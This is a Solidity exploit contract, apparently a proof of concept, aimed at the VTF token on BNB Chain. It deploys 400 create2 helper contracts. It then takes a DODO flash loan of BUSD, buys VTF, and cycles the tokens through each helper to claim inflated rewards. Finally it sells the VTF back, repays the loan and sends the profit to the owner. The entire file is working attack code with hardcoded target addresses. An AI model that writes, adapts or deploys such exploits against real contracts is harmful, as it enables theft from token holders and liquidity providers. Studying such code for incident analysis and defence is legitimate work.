//SPDX-License-Identifier:MIT
pragma solidity ^0.8.13;
import "./Interfaces.sol";
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";

contract MiniContract {
    IVTF vtf = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    address owner;

    constructor() {
        vtf.updateUserBalance(address(this));
        owner = msg.sender;
    }

    function getRewards() external {
        vtf.updateUserBalance(address(this));
        vtf.transfer(owner, vtf.balanceOf(address(this)));
        selfdestruct(payable(owner));
    }
}

contract VTFHack is Ownable {
    IDPPOracle constant dppOracle =
        IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IP2ERouter public constant router =
        IP2ERouter(0x7529740ECa172707D8edBCcdD2Cba3d140ACBd85);
    IVTF constant vtf = IVTF(0xc6548caF18e20F88cC437a52B6D388b0D54d830D);
    IERC20 constant busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address[] miniContracts;

    constructor() {
        // deploy multiple contract to set user's balance start time
        _deployContracts();
    }

    function _deployContracts() private {
        address addr;
        bytes memory bytecode = type(MiniContract).creationCode;
        uint256 salt;
        for (salt = 1000; salt < 1400; salt++) {
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            }
            miniContracts.push(addr);
        }
    }

    function exploit() external onlyOwner {
        bytes memory data = abi.encode(msg.sender);
        // Get flashloan from dodo
        (, uint256 busdReserve) = dppOracle.getVaultReserve();
        dppOracle.flashLoan(0, busdReserve, address(this), data);
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        require(msg.sender == address(dppOracle));
        require(sender == address(this));

        address originalCaller = abi.decode(data, (address));
        address[] memory path = new address[](2);
        path[0] = address(busd);
        path[1] = address(vtf);

        busd.approve(address(router), type(uint256).max);

        // Buy VTF token using BUSD received via flashloan
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busd.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );

        // Call each Minicontract's getRewards function
        address[] memory _miniContracts = miniContracts;
        for (uint256 i = 0; i < _miniContracts.length; i++) {
            vtf.transfer(_miniContracts[i], vtf.balanceOf(address(this)));
            (bool success, ) = _miniContracts[i].call(
                abi.encodeWithSelector(MiniContract.getRewards.selector)
            );
            if (!success) break;
        }

        // Swap VTF token for BUSD

        path[0] = address(vtf);
        path[1] = address(busd);
        vtf.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            vtf.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );

        // Replay flashloan
        busd.transfer(msg.sender, quoteAmount);
        busd.transfer(originalCaller, busd.balanceOf(address(this)));
    }
}
